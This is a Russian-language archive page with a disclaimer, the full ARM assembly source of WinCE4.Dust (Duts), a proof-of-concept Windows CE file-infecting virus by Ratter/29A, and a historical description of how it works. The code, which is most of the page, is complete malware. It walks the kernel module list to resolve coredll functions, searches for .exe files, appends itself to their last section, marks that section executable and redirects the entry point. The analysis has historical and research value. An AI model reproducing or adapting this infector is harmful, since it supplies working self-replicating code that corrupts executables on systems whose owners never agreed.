# Virus Dust

## **Дисклеймер**

**Материалы, разборы, фрагменты кода, схемы, конфигурации и описания, которые приводятся здесь, предназначены исключительно для образовательных, исследовательских и исторических целей. Они могут относиться к вредоносному ПО, эксплойтам, proof-of-concept коду, средствам обхода защит и другим потенциально опасным технологиям. Такие материалы не должны восприниматься как приглашение, инструкция или разрешение к их запуску, сборке, модификации, распространению или использованию в реальных системах.

Любые эксперименты с подобным кодом допустимы только в изолированной лабораторной среде, например на виртуальной машине, отдельном стенде или эмуляторе, без доступа к реальным данным, чужим устройствам, производственным сетям и интернету. Запуск вредоносного кода на чужом оборудовании, в чужой инфраструктуре или без явного разрешения владельца является незаконным и недопустимым.

Автор материалов не призывает к созданию, распространению или применению вредоносного ПО и не несёт ответственности за любые прямые или косвенные последствия, включая ущерб, потерю данных, нарушение работы систем или юридические риски, возникшие в результате использования приведённой информации. Законы и правила в разных странах отличаются, поэтому перед любыми действиями необходимо самостоятельно убедиться, что они не нарушают законодательство и не создают угрозу для других людей.

Материалы не заменяют консультацию специалиста по информационной безопасности, юридическую консультацию или официальные методики безопасного анализа. Если вы не уверены в своих действиях, не запускайте и не распространяйте подобный код. Изучайте его только в контролируемой среде и только в тех рамках, которые разрешены законом и владельцем инфраструктуры.**


## Source Code
```asm
** virus_source **

  CODE32
   EXPORT  WinMainCRTStartup
   AREA .text, CODE, ARM

virus_start

virus_code_start   PROC
   stmdb   sp!, {r0 - r12, lr, pc}
   mov    r11, sp
   sub    sp, sp, #56     

   bl    get_export_section

   adr   r2, import_ordinals
   mov   r3, sp
   bl    lookup_imports

 
   bl    ask_user
   beq    jmp_to_host     
   ;

   mov    r0, #0x23, 28
   mov    lr, pc
   ldr    pc, [r11, #-52]   
   mov    r4, r0

   cmp    r0, #0
   beq    jmp_to_host

   adr    r0, mask
   mov    r1, r4
   mov    lr, pc
   ldr    pc, [r11, #-24]   
   cmn    r0, #1
   beq    free_wfd

   mov    r5, r0
find_files_iterate
   ldr    r0, [r4, #28]     
   ldr    r1, [r4, #32]     

   cmp    r0, #0         
   bne    find_next_file

   cmp    r1, #0x1000      
   addgt   r0, r4, #40      
   blgt   infect_file

find_next_file
   mov    r0, r5
   mov    r1, r4
   mov    lr, pc
   ldr    pc, [r11, #-20]    
   cmp    r0, #0         
   bne    find_files_iterate

   mov    r0, r5
   mov    lr, pc
   ldr    pc, [r11, #-16]

free_wfd
   mov    r0, r4
   mov    lr, pc
   ldr    pc, [r11, #-48]    
   ;

jmp_to_host
   adr    r0, host_ep
   ldr    r1, [r0]        
   ldr    r2, [r11, #56]     
   add    r1, r1, r2       
   str    r1, [r11, #56]     

   mov    sp, r11
   ldmia   sp!, {r0 - r12, lr, pc}
   ENDP

   
mask   DCB    "*", 0x0, ".", 0x0, "e", 0x0, "x", 0x0, "e", 0x0, 0x0, 0x0

   
   
host_ep
   DCD    host_entry - virus_code_start - 8
   

import_ordinals
   DCW    2008       
   DCW    1041       
   DCW    1018       
   DCW    1167       
   DCW    553        
   DCW    548        
   DCW    549        
   DCW    550        
   DCW    167        
   DCW    181        
   DCW    180        
   DCW    858        

   DCD    0x0

   
wstrcmp   PROC
wstrcmp_iterate
   ldrh    r2, [r0], #2
   ldrh    r3, [r1], #2

   cmp    r2, #0
   cmpeq   r3, #0
   moveq   pc, lr

   cmp    r2, r3
   beq    wstrcmp_iterate

   mov    pc, lr
   ENDP

get_export_section   PROC
   stmdb   sp!, {r4 - r9, lr}

   ldr    r4, =0xffffc800   
   ldr    r5, =0x324     

   add    r5, r4, r5
   ldr    r5, [r5]

   

   mov    r6, r5
   mov    r7, #0

iterate
   ldr    r0, [r6, #8]     
   adr    r1, coredll
   bl    wstrcmp        

   ldreq   r7, [r6, #0x7c]    
   ldreq   r8, [r6, #0x8c]    

   add    r9, r7, r8
   beq    got_coredllbase    

   ldr    r6, [r6, #4]
   cmp    r6, #0
   cmpne   r6, r5
   bne    iterate        

got_coredllbase
   mov    r0, r7
   add    r1, r8, r7      
                   

   ldmia   sp!, {r4 - r9, pc}
   ENDP

coredll   DCB    "c", 0x0, "o", 0x0, "r", 0x0, "e", 0x0, "d", 0x0, "l", 0x0, "l", 0x0
      DCB    ".", 0x0, "d", 0x0, "l", 0x0, "l", 0x0, 0x0, 0x0


lookup_imports   PROC
   stmdb   sp!, {r4 - r6, lr}

   ldr    r4, [r1, #0x10]    
   ldr    r5, [r1, #0x1c]    
   add    r5, r5, r0

lookup_imports_iterate
   ldrh   r6, [r2], #2     
   cmp    r6, #0        

   subne   r6, r6, r4      
   ldrne   r6, [r5, r6, LSL #2] 
   addne   r6, r6, r0      
   strne   r6, [r3], #4     
   bne    lookup_imports_iterate

   ldmia    sp!, {r4 - r6, pc}
   ENDP



infect_file   PROC
   stmdb   sp!, {r0, r1, r4, r5, lr}

   mov    r4, r1
   mov    r8, r0

   bl    open_file       
   cmn    r0, #1
   beq    infect_file_end
   str    r0, [r11, #-8]    

   mov    r0, r4        
                   
   bl    create_mapping
   cmp    r0, #0
   beq    infect_file_end_close_file
   str    r0, [r11, #-4]    

   mov    r0, r4
   bl    map_file       
   cmp    r0, #0
   beq    infect_file_end_close_mapping
   mov    r5, r0

   bl    check_header     
   bne    infect_file_end_unmap_view

   ldr    r0, [r2, #0x4c]    
                   
   ldr    r1, =0x72617461    
   cmp    r0, r1        
   beq    infect_file_end_unmap_view

   ldr    r1, [r2, #0x3c]    
   adr    r0, virus_start
   adr    r2, virus_end     
   sub    r0, r2, r0
   mov    r7, r0        
   add    r0, r0, r4
   bl    _align_        
   mov    r6, r0        
                   

   mov    r0, r5
   mov    lr, pc
   ldr    pc, [r11, #-28]    

   ldr    r0, [r11, #-4]
   mov    lr, pc
   ldr    pc, [r11, #-40]    

   ;
   mov    r0, r8
   bl    open_file       
                   
                   
   cmn    r0, #1
   beq    infect_file_end
   str    r0, [r11, #-8]

   mov    r0, r6        
   bl    create_mapping    

   cmp    r0, #0
   beq    infect_file_end_close_file
   str    r0, [r11, #-4]

   mov    r0, r6
   bl    map_file       
   cmp    r0, #0
   beq    infect_file_end_close_mapping
   mov    r5, r0
   
   

   ldr    r4, [r5, #0x3c]    
   add    r4, r4, r5      

   ldrh   r1, [r4, #6]     
   sub    r1, r1, #1      
                   
   mov    r2, #0x28       
   mul    r0, r1, r2

   add    r0, r0, r4      
   add    r0, r0, #0x78     

   ldr    r1, [r4, #0x74]    
   mov    r1, r1, LSL #3    
   add    r0, r0, r1      
                   
                   

   ldr    r6, [r4, #0x28]    

   ldr    r1, [r0, #0x10]    
   ldr    r2, [r0, #0x14]    
   mov    r3, r1
   add    r1, r1, r2      
                   
                   
                   
   mov    r9, r1        

   ldr    r8, [r0, #0xc]    
   add    r3, r3, r8      
   str    r3, [r4, #0x28]    

   sub    r6, r6, r3      
                   
   sub    r6, r6, #8      
                   

   mov    r10, r0
   ldr    r0, [r10, #0x10]   
   add    r0, r0, r7      
   ldr    r1, [r4, #0x3c]
   bl    _align_        

   str    r0, [r10, #0x10]   
   str    r0, [r10, #0x8]    

   ldr    r1, [r10, #0xc]    
   add    r0, r0, r1      
   str    r0, [r4, #0x50]    

   ldr    r0, =0x60000020    
                   
   ldr    r1, [r10, #0x24]   
   orr    r0, r1, r0      
   str    r0, [r10, #0x24]   

   ldr    r0, =0x72617461
   str    r0, [r4, #0x4c]    

   add    r1, r9, r5      
   mov    r9, r1        
   adr    r0, virus_start
   mov    r2, r7
   bl    simple_memcpy

   adr    r0, host_ep      
                   
   adr    r1, virus_start
   sub    r0, r0, r1      
   str    r6, [r0, r9]     

infect_file_end_unmap_view
   mov    r0, r5
   mov    lr, pc        
   ldr    pc, [r11, #-28]
infect_file_end_close_mapping
   ldr    r0, [r11, #-4]
   mov    lr, pc        
   ldr    pc, [r11, #-40]
infect_file_end_close_file
   ldr    r0, [r11, #-8]
   mov    lr, pc        
   ldr    pc, [r11, #-40]
infect_file_end
   ldmia   sp!, {r0, r1, r4, r5, pc}   
   ENDP

   
   DCB    "This code arose from the dust of Permutation City"
   ALIGN    4


   
   
check_header  PROC
   ldrh   r0, [r5]
   ldr    r1, =0x5a4d      
   cmp    r0, r1
   bne    infect_file_end_close_mapping

   ldr    r2, [r5, #0x3c]
   add    r2, r2, r5

   ldrh   r0, [r2]
   ldr    r1, =0x4550      
   cmp    r0, r1
   bne    check_header_end

   ldrh   r0, [r2, #4]
   ldr    r1, =0x1c0      
   cmp    r0, r1
   bne    check_header_end

   ldrh   r0, [r2, #0x5C]    
   cmp    r0, #9
   bne    check_header_end

   ldrh   r0, [r2, #0x40]
   cmp    r0, #4        

check_header_end
   mov    pc, lr
   ENDP


open_file   PROC
   str    lr, [sp, #-4]!

   sub    sp, sp, #0xc
   mov    r1, #3
   str    r1, [sp]       
   mov    r3, #0
   mov    r2, #0
   str    r3, [sp, #8]
   str    r3, [sp, #4]
   mov    r1, #3, 2       
   mov    lr, pc
   ldr    pc, [r11, #-44]    
                   
                   
                   
   add    sp, sp, #0xc

   ldr    pc, [sp], #4
   ENDP


create_mapping   PROC
   str    lr, [sp, #-4]!

   mov    r1, #0
   sub    sp, sp, #8
   str    r0, [sp]
   str    r1, [sp, #4]
   mov    r2, #4        
   mov    r3, #0
   ldr    r0, [r11, #-8]
   mov    lr, pc
   ldr    pc, [r11, #-36]
   add    sp, sp, #8

   ldr    pc, [sp], #4
   ENDP


map_file   PROC
   str    lr, [sp, #-4]!

   sub    sp, sp, #4
   str    r0, [sp]
   ldr    r0, [r11, #-4]
   mov    r1, #6        
   mov    r2, #0
   mov    r3, #0
   mov    lr, pc
   ldr    pc, [r11, #-32]
   add    sp, sp, #4

   ldr    pc, [sp], #4
   ENDP


   



simple_memcpy   PROC
   ldr    r3, [r0], #4
   str    r3, [r1], #4
   subs   r2, r2, #4
   bne    simple_memcpy
   mov    pc, lr
   ENDP


   


_align_    PROC
   stmdb   sp!, {r4, r5, lr}

   mov    r4, r0
   mov    r5, r1

   mov    r0, r1
   mov    r1, r4

   
   

   mov    lr, pc
   ldr    pc, [r11, #-56]    

   sub    r1, r5, r1
   add    r0, r4, r1

   ldmia   sp!, {r4, r5, pc}
   ENDP

   
   
ask_user   PROC
   str    lr, [sp, #-4]!

   mov    r0, #0
   adr    r1, text
   adr    r2, caption
   mov    r3, #4

   mov    lr, pc
   ldr    pc, [r11, #-12]

   cmp    r0, #7

   ldr    pc, [sp], #4
   ENDP

   

   
caption DCB    "W", 0x0, "i", 0x0, "n", 0x0, "C", 0x0, "E", 0x0, "4", 0x0
     DCB    ".", 0x0, "D", 0x0, "u", 0x0, "s", 0x0, "t", 0x0, " ", 0x0
     DCB    "b", 0x0, "y", 0x0, " ", 0x0, "R", 0x0, "a", 0x0, "t", 0x0
     DCB    "t", 0x0, "e", 0x0, "r", 0x0, "/", 0x0, "2", 0x0, "9", 0x0
     DCB    "A", 0x0, 0x0, 0x0

     ALIGN    4

   

text   DCB    "D", 0x0, "e", 0x0, "a", 0x0, "r", 0x0, " ", 0x0, "U", 0x0
     DCB    "s", 0x0, "e", 0x0, "r", 0x0, ",", 0x0, " ", 0x0, "a", 0x0
     DCB    "m", 0x0, " ", 0x0, "I", 0x0, " ", 0x0, "a", 0x0, "l", 0x0
     DCB    "l", 0x0, "o", 0x0, "w", 0x0, "e", 0x0, "d", 0x0, " ", 0x0
     DCB    "t", 0x0, "o", 0x0, " ", 0x0, "s", 0x0, "p", 0x0, "r", 0x0
     DCB    "e", 0x0, "a", 0x0, "d", 0x0, "?", 0x0, 0x0, 0x0
     ALIGN    4

     

     DCB    "This is proof of concept code. Also, i wanted to make avers happy."
     DCB    "The situation when Pocket PC antiviruses detect only EICAR file had"
     DCB    " to end ..."
     ALIGN    4


   LTORG
virus_end

   

WinMainCRTStartup PROC
   b     virus_code_start
   ENDP

   
host_entry
   mvn    r0, #0
   mov    pc, lr
   END
** virus_source_end **
```

## Описание

   WinCE4.Dust — это первый известный файловый вирус, созданный специально для операционной системы Windows CE (которая использовалась в карманных компьютерах Pocket PC и смартфонах на базе Windows Mobile). Его также называют WinCE/Duts.1520 или просто Duts. Вирус написан на ассемблере для процессоров ARM и имеет очень маленький размер - 1520 байт. Автор скрывается под ником Ratter и состоит в международной вирусописательской группе 29A, которая известна созданием вирусов «доказательств концепции» (proof-of-concept), например, Cabir для Symbian OS. Главная цель Duts была не навредить пользователю, а показать, что Windows CE тоже уязвима для заражения, и заставить антивирусные компании обратить внимание на эту платформу.

### ⚙️ Как работает вирус: ключевые технические решения

   Главная сложность для вируса на Windows CE заключалась в том, чтобы найти адреса нужных системных функций. В обычном Windows для этого можно просканировать память в поисках заголовка «MZ» или использовать механизм обработки исключений (SEH), но на Windows CE эти трюки не работают: загруженные модули не имеют стандартных заголовков, а установка SEH требует изменения структуры PE-файла, что сложно для маленького вируса. Ratter нашёл обходной путь. Он использовал особенность архитектуры Windows CE: в пользовательском режиме по фиксированному адресу 0xFFFFC800 была доступна структура ядра KDataStruct. Внутри этой структуры, по смещению 0x324, находился указатель на односвязный список всех загруженных модулей (aInfo[KINX_MODULES]). Вирус проходит по этому списку и сравнивает имена модулей, пока не находит coredll.dll - главную системную библиотеку, аналог kernel32.dll в настольном Windows. Из структуры, описывающей coredll.dll, вирус извлекает два ключевых значения: базовый адрес загрузки модуля в памяти (imagebase) и RVA (относительный виртуальный адрес) его таблицы экспорта. Зная эти два значения, он может вычислить абсолютный адрес таблицы экспорта и затем найти в ней адреса всех необходимых ему функций.

   Второе важное решение - вирус не импортирует функции по именам, а использует порядковые номера (ordinals). Это делает код компактнее и надёжнее, так как имена функций в разных версиях системы могут отличаться. В коде вируса есть список ординалов для функций malloc, free, CreateFileMappingW, MapViewOfFile, FindFirstFileW и других. Когда вирус находит таблицу экспорта coredll.dll, он просто вычитает базовый ординал из каждого нужного номера и по этому индексу получает адрес функции из таблицы адресов экспорта.

### 🦠 Что делает вирус при запуске

   Логика работы Duts довольно проста и полностью управляется самим пользователем, что было необычно для вредоносных программ.

   1. Запрос разрешения: При запуске заражённого файла вирус первым делом показывает диалоговое окно с заголовком «WinCE4.Dust by Ratter/29A» и вопросом: «Dear User, am I allowed to spread?» (Уважаемый пользователь, разрешено ли мне распространяться?). Если пользователь отвечает «Нет», вирус немедленно передаёт управление обратно легитимной программе, и его работа на этом заканчивается.

   2. Поиск жертв: Если пользователь отвечает «Да», вирус начинает поиск файлов для заражения. Он использует функцию FindFirstFileW с маской *.exe, но, как признаётся сам автор в комментариях, он допустил ошибку: в Windows CE нет понятия «текущей директории», поэтому вирус всегда ищет файлы в корневом каталоге («My Device»), а не в папке, откуда был запущен.

   3. Фильтрация целей: Вирус заражает не все файлы. Он пропускает файлы размером 4096 байт и меньше и уже заражённые файлы.

   4. Заражение: Процесс заражения классический для файловых вирусов-паразитов:

      -  Вирус дописывает свой код в конец файла (в последнюю секцию).

      -  Он изменяет точку входа (Entry Point) в PE-заголовке файла так, чтобы она указывала на начало кода вируса.

      -  Чтобы код вируса мог выполняться, он помечает последнюю секцию как читаемую и исполняемую (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ).

      -  В неиспользуемое поле заголовка (Windows Version field) вирус записывает метку «atar», чтобы в будущем не заражать этот файл повторно.

   5. Передача управления: После завершения заражения или отказа пользователя вирус должен вернуть управление оригинальной программе, чтобы её работа выглядела нормально. Для этого он вычисляет «смещение» (displacement) от своего кода до оригинальной точки входа хоста и сохраняет его. При выходе он прибавляет это смещение к текущему значению программного счётчика (PC) и выполняет переход, таким образом возвращаясь в код хозяина.

### 💬 Скрытые послания и вывод

   Помимо основного функционала, в коде Duts спрятаны два текстовых сообщения, которые никогда не отображаются. Первое — это прямое обращение к антивирусным компаниям: «This is proof of concept code. Also, i wanted to make avers happy. The situation when Pocket PC antiviruses detect only EICAR file had to end...». Оно показывает, что автор считал своим долгом продемонстрировать уязвимость платформы и заставить разработчиков антивирусов выйти за рамки обнаружения только тестового файла EICAR. Второе сообщение - это цитата из научно-фантастического романа Грега Игана «Город перестановок»: «This code arose from the dust of Permutation City» (Этот код возник из пыли Города перестановок), откуда, вероятно, и произошло название вируса - Dust (пыль).

   Вывод: WinCE4.Dust - это не разрушительный вирус, а важный исторический артефакт и образовательный пример. Его главная ценность в том, что он доказал саму возможность заражения Windows CE, разрушив миф о неуязвимости мобильных платформ того времени. Вирус не имеет деструктивной полезной нагрузки, не крадёт данные и не пытается распространяться скрытно. Он полностью зависит от согласия пользователя и из-за ошибки автора заражает файлы только в корневой директории. Технические приёмы, использованные в Duts (доступ к KDataStruct для обхода защиты ядра и импорт функций по ординалам), стали важным уроком для исследователей безопасности и производителей антивирусов, наглядно показав, что даже «защищённые» операционные системы могут иметь неочевидные лазейки для выполнения кода. По сути, Duts — это классический «вирус-доказательство», который выполнил свою задачу: привлёк внимание к проблеме и заставил индустрию реагировать.
